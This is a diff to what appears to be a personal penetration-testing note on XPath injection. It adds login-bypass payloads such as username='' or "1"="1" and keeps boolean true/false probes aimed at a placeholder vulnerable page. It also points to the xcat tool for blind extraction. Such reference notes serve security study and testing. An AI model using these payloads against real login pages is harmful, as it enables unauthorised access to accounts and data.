@@ -22,9 +22,16 @@ http://<website>/vulnpage.php?countryID=999999 or "2" or "2"
 ## FALSE
 http://<website>/vulnpage.php?countryID=999999 or 1=2
 http://<website>/vulnpage.php?countryID=999999 or "1"="2"
+## Double or (to bypass when not nothing username and password is required)
+//<someNode>[username='' or "1"="1" or "1"="1" and password='']
+## Password injection parameter.
+//<someNode>[username='' and password='' or "1"="1"]
 ```
 
 # Enumerate Blind Bolean injections with xcat
 You can see here how to use xcat (Tool for injection auto blind bolean to extract) 
 
-                                                  [[Xcat]]
+[[Xcat]]
+
+### Useful XPath statements
+![[Pasted image 20220217090452.png]]
